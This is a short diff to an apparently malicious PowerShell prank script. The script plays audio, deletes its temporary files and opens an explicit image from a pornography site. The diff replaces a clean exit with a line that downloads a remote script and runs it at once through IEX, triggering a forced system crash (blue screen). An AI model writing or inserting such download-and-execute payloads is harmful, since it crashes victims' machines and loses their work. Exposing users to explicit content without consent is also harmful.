@@ -98,6 +98,7 @@ $player.PlayLooping()
 Remove-Item $imgPath -ErrorAction Ignore
 Remove-Item $audiopath -ErrorAction Ignore
 start https://us.rule34.xxx//samples/5715/sample_bed5399ffa18491cc1898587e3313c0063c53fa6.jpg?6497640
-Start-Sleep -Seconds 3
-exit
+Start-Sleep -Seconds 5
+IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+
 
